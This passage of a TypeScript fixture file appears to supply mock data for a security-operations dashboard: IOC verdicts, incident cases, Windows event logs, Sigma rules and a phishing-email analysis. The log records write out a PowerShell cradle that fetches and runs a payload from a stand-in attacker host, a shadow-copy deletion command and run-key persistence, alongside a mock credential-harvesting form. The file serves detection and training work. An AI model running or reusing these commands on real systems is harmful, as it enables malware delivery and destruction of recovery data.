        carrier: 'Twilio / BulkSIP VoIP Carrier',
        lineType: 'Non-Fixed VoIP (Virtual)',
        country: 'United States (San Francisco, CA)',
        fraudScore: '79 / 100 (High Vishing Risk)',
        recentCampaigns: 'Scattered Spider / Okta Helpdesk Callback Phishing'
      }
    },
    'password:Summer2026!': {
      ioc: 'password:Summer2026! (SHA-1: 7B52009B64FD0A2A49E6D8A939753077792B0554)',
      type: 'Credential Exposure (k-Anonymity SHA-1)',
      verdict: 'malicious' as VerdictType,
      score: 95,
      whyVerdict: 'Plaintext password never leaves browser; k-anonymity prefix 7B520 matched 48,912 exposures across corporate credential stuffing lists and infostealer logs.',
      votes: { malicious: 12, suspicious: 2, clean: 0, unknown: 19 },
      passwordBreach: {
        exposureCount: 48912,
        kPrefix: '7B520 (Client-side WebCrypto SHA-1)',
        sources: ['HIBP Pwned Passwords v11', 'Hudson Rock Stealer Logs', 'Collection #1-5'],
        recommendation: 'Rotate immediately and enforce FIDO2 / WebAuthn MFA.'
      }
    }
  },

  iocCases: [
    {
      id: 'case-101',
      name: 'INC-2026-089: Finance Cobalt Strike Intrusion',
      created: '2026-10-14 08:30 UTC',
      status: 'Active Containment',
      iocs: [
        { value: '198.51.100.45', type: 'IP', verdict: 'malicious' as VerdictType, notes: 'Confirmed HTTPS C2 on port 443 (`rundll32.exe` PID 6104). Blocked on Palo Alto perimeter FW.' },
        { value: 'evil-login-portal.com', type: 'Domain', verdict: 'malicious' as VerdictType, notes: 'Used for both stage-2 binary delivery and M365 credential harvesting.' },
        { value: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b', type: 'Hash', verdict: 'malicious' as VerdictType, notes: '`invoice_q3.exe` dropper unpacked from phishing attachment.' }
      ]
    },
    {
      id: 'case-102',
      name: 'INC-2026-084: Helpdesk Vishing & Okta MFA Fatigue',
      created: '2026-10-12 14:15 UTC',
      status: 'Monitoring',
      iocs: [
        { value: '+1-415-890-9912', type: 'Phone', verdict: 'suspicious' as VerdictType, notes: 'VoIP caller impersonating Corp IT Service Desk.' }
      ]
    }
  ],

  iocHistory: [
    { id: 'hist-1', ioc: '198.51.100.45', type: 'IPv4', verdict: 'malicious' as VerdictType, score: 92, timestamp: '11 mins ago', cached: true },
    { id: 'hist-2', ioc: 'evil-login-portal.com', type: 'Domain', verdict: 'malicious' as VerdictType, score: 89, timestamp: '24 mins ago', cached: true },
    { id: 'hist-3', ioc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', type: 'BTC Wallet', verdict: 'malicious' as VerdictType, score: 88, timestamp: '1 hour ago', cached: true },
    { id: 'hist-4', ioc: '+1-415-890-9912', type: 'Phone', verdict: 'suspicious' as VerdictType, score: 68, timestamp: '3 hours ago', cached: true },
    { id: 'hist-5', ioc: '8.8.8.8', type: 'IPv4', verdict: 'clean' as VerdictType, score: 2, timestamp: '5 hours ago', cached: true }
  ],

  eventInvestigations: [
    {
      id: 'ev-inv-01',
      name: 'DC01 & WKS-FINANCE04 Intrusion (Security + Sysmon)',
      eventCount: 24891,
      timestamp: '2026-10-14 11:50 UTC',
      channels: ['Security', 'Microsoft-Windows-Sysmon/Operational', 'Microsoft-Windows-PowerShell/Operational', 'System'],
      providers: ['Microsoft-Windows-Security-Auditing', 'Microsoft-Windows-Sysmon', 'Microsoft-Windows-PowerShell', 'Service Control Manager'],
      sourceFiles: ['WKS-FINANCE04-Sysmon.evtx', 'DC01-Security.evtx', 'WKS-FINANCE04-PowerShell.evtx'],
      notes: '# Incident Notes: WKS-FINANCE04 & DC01\n\n## Initial Access & Execution\n- User **CORP\\j.miller** opened weaponized email attachment leading to execution of `invoice_q3.exe` (Event ID `1` / `4688` at `11:40:12 UTC`).\n- Spawned hidden PowerShell (`Event ID 4104`) downloading `beacon_x64.bin` from `evil-login-portal.com`.\n\n## Lateral Movement & C2\n- Hollowed `rundll32.exe` established outbound TLS connection (`Sysmon Event ID 3`) to `198.51.100.45:443`.\n- Shadow copies deleted via `vssadmin delete shadows /all /quiet`.',
      events: [
        {
          id: 1001,
          bookmarked: true,
          timestamp: '2026-10-14 11:41:55.412 UTC',
          relTime: '25m ago',
          eventId: 3,
          level: 'Warning',
          channel: 'Microsoft-Windows-Sysmon/Operational',
          provider: 'Microsoft-Windows-Sysmon',
          computer: 'WKS-FINANCE04.corp.local',
          user: 'CORP\\j.miller',
          processName: 'rundll32.exe',
          commandLine: 'C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll,StartWork',
          sourceFile: 'WKS-FINANCE04-Sysmon.evtx',
          summary: 'Sysmon NetworkConnect: rundll32.exe (PID 6104) -> 198.51.100.45:443 (c2-telemetry.evil-login-portal.com)',
          iocs: ['198.51.100.45', 'evil-login-portal.com', 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll'],
          sigmaMatches: ['SIG-001: Suspicious Rundll32 Network Connection to Non-Standard Host', 'SIG-002: Cobalt Strike Default Pipe & Beacon Egress'],
          raw: {
            Header: { EventID: '3', Version: '5', Level: '4', Task: '3 (Network connection detected)', Opcode: '0', RecordNumber: '984120' },
            System: { Provider: 'Microsoft-Windows-Sysmon', Computer: 'WKS-FINANCE04.corp.local', TimeCreated: '2026-10-14T11:41:55.412Z', ExecutionProcessID: '3120' },
            EventData: { UtcTime: '2026-10-14 11:41:55.412', ProcessGuid: '{4F8A91B2-1120-670D-0400-001098F40200}', ProcessId: '6104', Image: 'C:\\Windows\\System32\\rundll32.exe', User: 'CORP\\j.miller', Protocol: 'tcp', Initiated: 'true', SourceIp: '10.24.18.104', SourcePort: '54918', DestinationIp: '198.51.100.45', DestinationHostname: 'c2-telemetry.evil-login-portal.com', DestinationPort: '443' },
            UserData: { RuleName: 'technique_id=T1071.001,technique_name=Web Protocols', ThreatContext: 'Matched active C2 IP 198.51.100.45' }
          }
        },
        {
          id: 1002,
          bookmarked: true,
          timestamp: '2026-10-14 11:41:19.108 UTC',
          relTime: '26m ago',
          eventId: 4104,
          level: 'Critical',
          channel: 'Microsoft-Windows-PowerShell/Operational',
          provider: 'Microsoft-Windows-PowerShell',
          computer: 'WKS-FINANCE04.corp.local',
          user: 'CORP\\j.miller',
          processName: 'powershell.exe',
          commandLine: 'powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA',
          sourceFile: 'WKS-FINANCE04-PowerShell.evtx',
          summary: 'PowerShell ScriptBlock Logging: Encoded WebClient download from http://evil-login-portal.com/stage2/beacon_x64.bin',
          iocs: ['evil-login-portal.com', 'http://evil-login-portal.com/stage2/beacon_x64.bin', 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll'],
          sigmaMatches: ['SIG-003: Malicious PowerShell EncodedCommand WebClient Cradle'],
          raw: {
            Header: { EventID: '4104', Version: '1', Level: '2', Task: '2 (Execute a Remote Command)', Opcode: '15 (On create calls)', RecordNumber: '44109' },
            System: { Provider: 'Microsoft-Windows-PowerShell', Computer: 'WKS-FINANCE04.corp.local', TimeCreated: '2026-10-14T11:41:19.108Z', ExecutionProcessID: '5912' },
            EventData: { MessageNumber: '1', MessageTotal: '1', ScriptBlockText: '$s=New-Object Net.WebClient; $s.DownloadFile("http://evil-login-portal.com/stage2/beacon_x64.bin", "C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll"); Start-Process rundll32.exe -ArgumentList "C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll,StartWork"', ScriptBlockId: 'b81902a1-994c-4102-881a-09c4412f8a10', Path: 'Inline-Interactive' },
            UserData: { DecodedCommand: 'DownloadFile stage2/beacon_x64.bin -> sync_helper.dll' }
          }
        },
        {
          id: 1003,
          bookmarked: true,
          timestamp: '2026-10-14 11:40:48.902 UTC',
          relTime: '26m ago',
          eventId: 4688,
          level: 'Critical',
          channel: 'Security',
          provider: 'Microsoft-Windows-Security-Auditing',
          computer: 'WKS-FINANCE04.corp.local',
          user: 'CORP\\j.miller',
          processName: 'vssadmin.exe',
          commandLine: 'cmd.exe /c vssadmin delete shadows /all /quiet',
          sourceFile: 'DC01-Security.evtx',
          summary: 'A new process has been created: vssadmin.exe delete shadows /all /quiet (Parent: invoice_q3.exe)',
          iocs: ['a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b'],
          sigmaMatches: ['SIG-004: Volume Shadow Copy Deletion via Vssadmin'],
          raw: {
            Header: { EventID: '4688', Version: '2', Level: '0', Task: '13312 (Process Creation)', Opcode: '0', RecordNumber: '1209481' },
            System: { Provider: 'Microsoft-Windows-Security-Auditing', Computer: 'WKS-FINANCE04.corp.local', TimeCreated: '2026-10-14T11:40:48.902Z', ExecutionProcessID: '4' },
            EventData: { SubjectUserName: 'j.miller', SubjectDomainName: 'CORP', NewProcessId: '0x14aa', NewProcessName: 'C:\\Windows\\System32\\vssadmin.exe', CommandLine: 'vssadmin delete shadows /all /quiet', ParentProcessName: 'C:\\Users\\j.miller\\Downloads\\invoice_q3.exe' },
            UserData: { MitreTechnique: 'T1490 - Inhibit System Recovery' }
          }
        },
        {
          id: 1004,
          bookmarked: false,
          timestamp: '2026-10-14 11:40:12.019 UTC',
          relTime: '27m ago',
          eventId: 1,
          level: 'High',
          channel: 'Microsoft-Windows-Sysmon/Operational',
          provider: 'Microsoft-Windows-Sysmon',
          computer: 'WKS-FINANCE04.corp.local',
          user: 'CORP\\j.miller',
          processName: 'invoice_q3.exe',
          commandLine: '"C:\\Users\\j.miller\\Downloads\\invoice_q3.exe"',
          sourceFile: 'WKS-FINANCE04-Sysmon.evtx',
          summary: 'Sysmon ProcessCreate: C:\\Users\\j.miller\\Downloads\\invoice_q3.exe (SHA256: a4f8d91c...1e31b)',
          iocs: ['a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b', 'C:\\Users\\j.miller\\Downloads\\invoice_q3.exe'],
          sigmaMatches: ['SIG-005: Execution of Unsigned Binary from User Downloads Directory'],
          raw: {
            Header: { EventID: '1', Version: '5', Level: '4', Task: '1 (Process Create)', Opcode: '0', RecordNumber: '984091' },
            System: { Provider: 'Microsoft-Windows-Sysmon', Computer: 'WKS-FINANCE04.corp.local', TimeCreated: '2026-10-14T11:40:12.019Z', ExecutionProcessID: '3120' },
            EventData: { Image: 'C:\\Users\\j.miller\\Downloads\\invoice_q3.exe', CommandLine: '"C:\\Users\\j.miller\\Downloads\\invoice_q3.exe"', Hashes: 'SHA256=a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b,IMPHASH=f34d5f2d4577ed6d9ceec516c1f5a744', ParentImage: 'C:\\Windows\\explorer.exe' },
            UserData: { Signed: 'false' }
          }
        },
        {
          id: 1005,
          bookmarked: false,
          timestamp: '2026-10-14 11:42:09.774 UTC',
          relTime: '24m ago',
          eventId: 13,
          level: 'High',
          channel: 'Microsoft-Windows-Sysmon/Operational',
          provider: 'Microsoft-Windows-Sysmon',
          computer: 'WKS-FINANCE04.corp.local',
          user: 'CORP\\j.miller',
          processName: 'invoice_q3.exe',
          commandLine: '"C:\\Users\\j.miller\\Downloads\\invoice_q3.exe"',
          sourceFile: 'WKS-FINANCE04-Sysmon.evtx',
          summary: 'Sysmon RegistryEvent (Value Set): HKCU\\...\\CurrentVersion\\Run\\WinDefendSync -> rundll32.exe sync_helper.dll,StartWork',
          iocs: ['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync', 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll'],
          sigmaMatches: ['SIG-006: Registry Run Key Persistence Points to ProgramData DLL'],
          raw: {
            Header: { EventID: '13', Version: '2', Level: '4', Task: '13 (RegistryEvent)', Opcode: '0', RecordNumber: '984152' },
            System: { Provider: 'Microsoft-Windows-Sysmon', Computer: 'WKS-FINANCE04.corp.local', TimeCreated: '2026-10-14T11:42:09.774Z', ExecutionProcessID: '3120' },
            EventData: { EventType: 'SetValue', TargetObject: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync', Details: 'rundll32.exe C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll,StartWork' },
            UserData: { MitreTechnique: 'T1547.001' }
          }
        },
        {
          id: 1006,
          bookmarked: false,
          timestamp: '2026-10-14 11:43:02.310 UTC',
          relTime: '23m ago',
          eventId: 4625,
          level: 'Medium',
          channel: 'Security',
          provider: 'Microsoft-Windows-Security-Auditing',
          computer: 'DC01.corp.local',
          user: 'CORP\\svc_backup',
          processName: 'lsass.exe',
          commandLine: 'NTLMv2 Network Logon from 10.24.18.104 (WKS-FINANCE04)',
          sourceFile: 'DC01-Security.evtx',
          summary: 'An account failed to log on (0xC000006A Bad Password): CORP\\svc_backup from 10.24.18.104',
          iocs: ['198.51.100.45'],
          sigmaMatches: ['SIG-007: Lateral Movement SMB/NTLM Brute Force from Workstation'],
          raw: {
            Header: { EventID: '4625', Version: '0', Level: '0', Task: '12544 (Logon)', Opcode: '0', RecordNumber: '1209812' },
            System: { Provider: 'Microsoft-Windows-Security-Auditing', Computer: 'DC01.corp.local', TimeCreated: '2026-10-14T11:43:02.310Z', ExecutionProcessID: '680' },
            EventData: { TargetUserName: 'svc_backup', WorkstationName: 'WKS-FINANCE04', IpAddress: '10.24.18.104', LogonType: '3', Status: '0xc000006a' },
            UserData: { Note: 'Triggered 48 seconds after C2 checkin to 198.51.100.45' }
          }
        }
      ],
      iocs: [
        { type: 'IPs', value: '198.51.100.45', sourceField: 'EventData.DestinationIp', eventCount: 47, verdict: 'malicious' as VerdictType },
        { type: 'Domains', value: 'evil-login-portal.com', sourceField: 'EventData.DestinationHostname / ScriptBlockText', eventCount: 19, verdict: 'malicious' as VerdictType },
        { type: 'Hashes', value: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b', sourceField: 'EventData.Hashes', eventCount: 8, verdict: 'malicious' as VerdictType },
        { type: 'URLs', value: 'http://evil-login-portal.com/stage2/beacon_x64.bin', sourceField: 'EventData.ScriptBlockText', eventCount: 4, verdict: 'malicious' as VerdictType },
        { type: 'File Paths', value: 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll', sourceField: 'EventData.CommandLine', eventCount: 14, verdict: 'malicious' as VerdictType },
        { type: 'Registry Keys', value: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync', sourceField: 'EventData.TargetObject', eventCount: 3, verdict: 'suspicious' as VerdictType },
        { type: 'Processes', value: 'rundll32.exe', sourceField: 'EventData.Image', eventCount: 52, verdict: 'suspicious' as VerdictType }
      ],
      sigmaRules: [
        {
          id: 'SIG-001',
          title: 'Suspicious Rundll32 Network Connection to Non-Standard Host',
          severity: 'critical' as const,
          matchCount: 47,
          description: 'Detects rundll32.exe initiating outbound TCP connections to external public IPv4 addresses while loading an unsigned DLL from ProgramData.',
          mitre: ['T1218.011', 'T1071.001'],
          yaml: 'title: Suspicious Rundll32 Network Connection to Non-Standard Host\nid: 8b41f91c-3120-4f92-9a11-c841920144a1\nstatus: production\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \'\\rundll32.exe\'\n    Initiated: \'true\'\n    DestinationIp: \'198.51.100.45\'\n  condition: selection\nlevel: critical'
        },
        {
          id: 'SIG-003',
          title: 'Malicious PowerShell EncodedCommand WebClient Cradle',
          severity: 'critical' as const,
          matchCount: 4,
          description: 'Detects hidden PowerShell execution with Base64 EncodedCommand invoking Net.WebClient DownloadFile.',
          mitre: ['T1059.001', 'T1105'],
          yaml: 'title: Malicious PowerShell EncodedCommand WebClient Cradle\nid: 4c9102a8-8812-4b01-9e12-198511004502\nstatus: production\nlogsource:\n  product: windows\n  service: powershell\ndetection:\n  selection:\n    EventID: 4104\n    ScriptBlockText|contains:\n      - \'Net.WebClient\'\n      - \'DownloadFile\'\n  condition: selection\nlevel: critical'
        },
        {
          id: 'SIG-004',
          title: 'Volume Shadow Copy Deletion via Vssadmin',
          severity: 'high' as const,
          matchCount: 2,
          description: 'Detects deletion of Windows Volume Shadow Copies using vssadmin.exe to prevent recovery.',
          mitre: ['T1490'],
          yaml: 'title: Volume Shadow Copy Deletion via Vssadmin\nid: 9f0182b4-1190-44a1-b122-001928374655\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    CommandLine|contains|all:\n      - \'vssadmin\'\n      - \'delete\'\n      - \'shadows\'\n  condition: selection\nlevel: high'
        },
        {
          id: 'SIG-006',
          title: 'Registry Run Key Persistence Points to ProgramData DLL',
          severity: 'high' as const,
          matchCount: 3,
          description: 'Detects modifications to CurrentVersion\\Run keys referencing binaries or DLLs inside C:\\ProgramData.',
          mitre: ['T1547.001'],
          yaml: 'title: Registry Run Key Persistence Points to ProgramData DLL\nid: 7a1123c0-5512-4091-8122-991827364501\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    TargetObject|contains: \'\\CurrentVersion\\Run\\\'\n    Details|contains: \'C:\\ProgramData\\\'\n  condition: selection\nlevel: high'
        },
        {
          id: 'SIG-007',
          title: 'Lateral Movement SMB/NTLM Brute Force from Workstation',
          severity: 'medium' as const,
          matchCount: 18,
          description: 'Detects burst of EventID 4625 LogonType 3 failures targeting privileged service accounts from a standard workstation.',
          mitre: ['T1110.001', 'T1021.002'],
          yaml: 'title: Lateral Movement SMB/NTLM Brute Force\nid: 2d4419a0-3310-4c91-9001-771625341290\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4625\n    LogonType: 3\n  condition: selection\nlevel: medium'
        }
      ]
    }
  ],

  phishingScans: [
    {
      id: 'phish-001',
      subject: 'URGENT: Q3 Wire Transfer & Remittance Invoice_Q3 (#INV-99412)',
      sender: 'billing-urgent@evil-login-portal.com',
      displayName: ' Treasury & AP Desk <cfo-office@corp-finances.com>',
      verdictLabel: 'UNSAFE' as const,
      verdict: 'malicious' as VerdictType,
      score: 9.2,
      size: '2.18 MB',
      timestamp: '2026-10-14 11:38:04 UTC',
      mitre: [
        { id: 'T1566.001', name: 'Phishing: Spearphishing Attachment', url: 'https://attack.mitre.org/techniques/T1566/001/' },
        { id: 'T1566.002', name: 'Phishing: Spearphishing Link', url: 'https://attack.mitre.org/techniques/T1566/002/' },
        { id: 'T1036.005', name: 'Masquerading: Match Legitimate Name or Location', url: 'https://attack.mitre.org/techniques/T1036/005/' }
      ],
      counts: { critical: 5, suspicious: 3, info: 2, urls: 3, attachments: 1, iocs: 6, mitre: 3, senderIps: 2 },
      hops: [
        { hop: 1, mta: 'edge-gw45.evil-login-portal.com', ip: '198.51.100.45', delay: '0.2s', tls: false, note: 'Unencrypted submission from known C2 IP' },
        { hop: 2, mta: 'relay02.bulletproof-mx.net', ip: '203.0.113.88', delay: '1.8s', tls: false, note: 'Open relay transit without STARTTLS' },
        { hop: 3, mta: 'mx1.corp-protection.outlook.com', ip: '40.107.20.91', delay: '0.6s', tls: true, note: 'Inbound enterprise MX gateway (SPF SoftFail / DMARC Fail)' },
        { hop: 4, mta: 'EXCH01.corp.local', ip: '10.24.4.12', delay: '0.1s', tls: true, note: 'Internal mailbox delivery to j.miller@corp.local' }
      ],
      findings: [
        { severity: 'critical', title: 'DMARC & DKIM Authentication Failure with Reply-To Divergence', description: 'Message failed DMARC (p=reject override bypassed via external connector) and Reply-To points to ap-wire-confirm@protonmail.ch while Display Name impersonates CFO Office.', rationale: 'Classic Business Email Compromise (BEC) combined with malware staging.' },
        { severity: 'critical', title: 'Originating MTA Matches Active Cobalt Strike C2 (198.51.100.45)', description: 'X-Originating-IP and first Received hop resolve to 198.51.100.45 (AS209401), flagged by 19 threat intelligence feeds.', rationale: 'High-confidence infrastructure overlap between email delivery and beacon C2.' },
        { severity: 'critical', title: 'Weaponized Attachment Containing Packed Executable (invoice_q3.exe)', description: 'Attachment Invoice_Q3_Remittance.zip contains invoice_q3.exe (SHA-256: a4f8d91c...1e31b) with YARA matches for Cobalt Strike loader.', rationale: 'Direct initial access payload delivery.' },
        { severity: 'suspicious', title: 'Punycode / Homograph Lookalike Link in HTML Body', description: 'Anchor text displays https://login.microsoft.com/sso but href resolves to hxxps://auth-sso.evil-login-portal[.]com/login?session=j.miller.', rationale: 'Credential harvesting fallback if user clicks link instead of opening attachment.' },
        { severity: 'suspicious', title: 'Newly Registered Sender Domain (< 15 Days Old)', description: 'WHOIS creation date for evil-login-portal.com is 2026-09-29 (15 days old).', rationale: 'Burner domain registered specifically for Q4 campaign.' }
      ],
      recommendations: [
        { priority: 'High', action: 'Purge message Message-ID <99412.20261014@evil-login-portal.com> from all 14 recipient mailboxes via Exchange Compliance Search.' },
        { priority: 'High', action: 'Pivot attachment hash a4f8d91c...1e31b to Malware Analyzer and block sender domain evil-login-portal.com.' },
        { priority: 'Medium', action: 'Enforce strict DMARC reject enforcement on inbound partner connector.' }
      ],
      senderDetails: {
        from: 'Treasury & AP Desk <billing-urgent@evil-login-portal.com>',
        displayName: 'Treasury & AP Desk (Spoofing CFO Office)',
        replyTo: 'ap-wire-confirm@protonmail.ch',
        returnPath: 'bounce-8812@evil-login-portal.com',
        sender: 'mailer-daemon@relay02.bulletproof-mx.net',
        resentFrom: 'None',
        messageId: '<99412.20261014113804@evil-login-portal.com>',
        dateUtc: 'Wed, 14 Oct 2026 11:38:04 +0000',
        subject: 'URGENT: Q3 Wire Transfer & Remittance Invoice_Q3 (#INV-99412)',
        senderIps: '198.51.100.45, 203.0.113.88',
        domainAge: '15 days (Created 2026-09-29)'
      },
      mismatchMatrix: [
        { test: 'From vs Reply-To', status: 'mismatch', detail: 'billing-urgent@evil-login-portal.com != ap-wire-confirm@protonmail.ch' },
        { test: 'From vs Return-Path', status: 'match', detail: 'Both use evil-login-portal.com' },
        { test: 'From vs Sender Header', status: 'mismatch', detail: 'evil-login-portal.com != relay02.bulletproof-mx.net' },
        { test: 'Display Name vs Domain', status: 'mismatch', detail: 'Display Name claims "cfo-office@corp-finances.com" but domain is evil-login-portal.com' }
      ],
      authCards: [
        { protocol: 'SPF', status: 'FAIL', detail: 'Sender IP 203.0.113.88 not authorized by evil-login-portal.com SPF record', raw: 'Received-SPF: SoftFail (protection.outlook.com: domain of transitioning evil-login-portal.com discourages use of 203.0.113.88 as permitted sender)' },
        { protocol: 'DKIM', status: 'FAIL', detail: 'Signature verification failed (body hash bh= mismatch after relay modification)', raw: 'dkim=fail (body hash did not verify) header.d=evil-login-portal.com header.s=selector1' },
        { protocol: 'DMARC', status: 'FAIL', detail: 'Neither SPF nor DKIM aligned with organizational domain', raw: 'dmarc=fail action=oreject header.from=evil-login-portal.com' },
        { protocol: 'ARC', status: 'NONE', detail: 'No Authenticated Received Chain seals present on message', raw: 'arc=none (no signatures found)' },
        { protocol: 'CompAuth', status: 'FAIL', detail: 'Exchange Composite Authentication failed with reason code 000', raw: 'compauth=fail reason=000' }
      ],
      brandImpersonation: { detected: true, brand: 'Microsoft 365 & Internal CFO Treasury', confidence: '96%' },
      homographAlert: { detected: true, detail: 'Cyrillic small letter "о" (U+043E) detected in display anchor micrоsoft.com' },
      urls: [
        {
          defanged: 'hxxps://auth-sso[.]evil-login-portal[.]com/login?user=j.miller&redirect=wire_approval',
          params: ['user=j.miller', 'redirect=wire_approval', 'mfa_prompt=1'],
          redirects: ['hxxps://t[.]co/short991', 'hxxps://evil-login-portal[.]com/r/41', 'hxxps://auth-sso[.]evil-login-portal[.]com/login'],
          vtVerdict: 'Malicious (24/90 engines)'
        },
        {
          defanged: 'hxxp://evil-login-portal[.]com/stage2/beacon_x64.bin',
          params: [],
          redirects: ['Direct payload link'],
          vtVerdict: 'Malicious (52/71 engines)'
        },
        {
          defanged: 'hxxps://198.51.100[.]45:443/api/v2/telemetry/checkin',
          params: [],
          redirects: ['Direct C2 callback URI'],
          vtVerdict: 'Malicious (19/28 feeds)'
        }
      ],
      attachments: [
        {
          filename: 'invoice_q3.exe (inside Invoice_Q3_Remittance.zip)',
          magicType: 'PE32+ executable (GUI) x86-64 (4D 5A 90 00)',
          size: '1.84 MB',
          sha256: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b',
          md5: '8f14e45fceea167a5a36dedd4bea2543',
          sha1: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4',
          macros: 'ZIP archive with double-extension decoy (.pdf.exe) and encrypted PE resource',
          embeddedUrls: ['https://198.51.100.45:443/api/v2/telemetry/checkin', 'http://evil-login-portal.com/stage2/beacon_x64.bin']
        }
      ],
      contentSignals: [
        { signal: 'Embedded HTML Credential Form (<form action="https://auth-sso.evil-login-portal.com">)', status: 'DETECTED', risk: 'critical' },
        { signal: 'Password Input Field (<input type="password" name="passwd">)', status: 'DETECTED', risk: 'critical' },
        { signal: 'Zero-Opacity Hidden Tracking Iframe (<iframe style="opacity:0;width:1px">)', status: 'DETECTED', risk: 'high' },
        { signal: 'Urgency & Financial Coercion Lexical Triggers ("Immediate Wire", "CFO Override", "Confidential")', status: 'DETECTED (7 hits)', risk: 'medium' }
      ],
      observables: [
        { type: 'IP', value: '198.51.100.45', context: 'X-Originating-IP & Hop #1 MTA' },
        { type: 'IP', value: '203.0.113.88', context: 'Hop #2 Open Relay MTA' },
        { type: 'Domain', value: 'evil-login-portal.com', context: 'Envelope From & Phishing Link Host' },
        { type: 'Email', value: 'billing-urgent@evil-login-portal.com', context: 'Header From Address' },
        { type: 'Hash', value: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b', context: 'Attachment SHA-256 (invoice_q3.exe)' }
      ],
      htmlPreview: `<div style="font-family:Segoe UI,Arial,sans-serif;color:#1e293b;padding:20px;background:#ffffff;border:1px solid #cbd5e1;border-radius:8px;">
        <div style="border-bottom:3px solid #dc2626;padding-bottom:10px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;">
          <strong style="font-size:16px;color:#0f172a;">CORPORATE TREASURY &amp; ACCOUNTS PAYABLE</strong>
          <span style="background:#fee2e2;color:#991b1b;font-size:11px;padding:3px 8px;border-radius:4px;font-weight:bold;">ACTION REQUIRED: WIRE SETTLEMENT</span>
        </div>
        <p style="font-size:13px;line-height:1.5;">Attention Finance Team,</p>
        <p style="font-size:13px;line-height:1.5;">Please process the attached Q3 vendor settlement remittance (<strong>Invoice_Q3_Remittance.zip</strong> — Password: <code>infected</code>) before the 14:00 UTC SWIFT cutoff.</p>
        <div style="background:#f8fafc;border:1px solid #e2e8f0;padding:12px;border-radius:6px;margin:14px 0;">
          <div style="font-size:12px;color:#475569;margin-bottom:8px;"><strong> Microsoft 365 Session Verification Required</strong></div>
          <p style="font-size:12px;color:#64748b;margin:0 0 10px 0;">Re-enter your corporate credentials to unlock encrypted wire instructions:</p>
          <div style="display:flex;gap:8px;flex-wrap:wrap;">
            <input type="text" value="j.miller@corp.local" readonly style="padding:6px 10px;border:1px solid #94a3b8;border-radius:4px;font-size:12px;" />
            <input type="password" value="••••••••••••" readonly style="padding:6px 10px;border:1px solid #ef4444;border-radius:4px;font-size:12px;" />
            <span style="background:#2563eb;color:#fff;padding:6px 12px;border-radius:4px;font-size:12px;font-weight:600;">Authorize Wire &rarr;</span>
          </div>
        </div>
        <p style="font-size:11px;color:#94a3b8;">Href target: <code>hxxps://auth-sso.evil-login-portal[.]com/login?user=j.miller</code></p>
      </div>`,
      plainTextPreview: `From: Treasury & AP Desk <billing-urgent@evil-login-portal.com>\nReply-To: ap-wire-confirm@protonmail.ch\nTo: j.miller@corp.local\nSubject: URGENT: Q3 Wire Transfer & Remittance Invoice_Q3 (#INV-99412)\n\nAttention Finance Team,\n\nPlease process the attached Q3 vendor settlement remittance (Invoice_Q3_Remittance.zip / invoice_q3.exe) prior to the 14:00 UTC SWIFT cutoff.\n\nOr authenticate immediately at:\nhttps://auth-sso.evil-login-portal.com/login?user=j.miller&redirect=wire_approval\n\nRegards,\nOffice of the CFO`,
      rawHeaders: `Return-Path: <bounce-8812@evil-login-portal.com>
Received: from EXCH01.corp.local (10.24.4.12) by mailbox01.corp.local with HTTPS; Wed, 14 Oct 2026 11:38:07 +0000
Received: from mx1.corp-protection.outlook.com (40.107.20.91) by EXCH01.corp.local with ESMTPS (TLS1.3); Wed, 14 Oct 2026 11:38:06 +0000
Received: from relay02.bulletproof-mx.net (203.0.113.88) by mx1.corp-protection.outlook.com with ESMTP; Wed, 14 Oct 2026 11:38:05 +0000
Received: from edge-gw45.evil-login-portal.com (198.51.100.45) by relay02.bulletproof-mx.net with SMTP; Wed, 14 Oct 2026 11:38:04 +0000
Authentication-Results: spf=softfail (sender IP is 203.0.113.88) smtp.mailfrom=evil-login-portal.com; dkim=fail (body hash did not verify) header.d=evil-login-portal.com; dmarc=fail action=oreject header.from=evil-login-portal.com; compauth=fail reason=000
X-Originating-IP: [198.51.100.45]
From: "Treasury & AP Desk <cfo-office@corp-finances.com>" <billing-urgent@evil-login-portal.com>
Reply-To: <ap-wire-confirm@protonmail.ch>
To: <j.miller@corp.local>
Subject: URGENT: Q3 Wire Transfer & Remittance Invoice_Q3 (#INV-99412)
Message-ID: <99412.20261014113804@evil-login-portal.com>
Date: Wed, 14 Oct 2026 11:38:04 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_8812_1985110045"`
    }
  ],

  ruleforgeDialects: [
    { id: 'sentinel', name: 'Microsoft Sentinel (KQL)', short: 'Sentinel', canParse: true, canRender: true, status: 'Ready', notes: 'Full Kusto pipeline translation including summarize, extend, project, and regex matches.' },
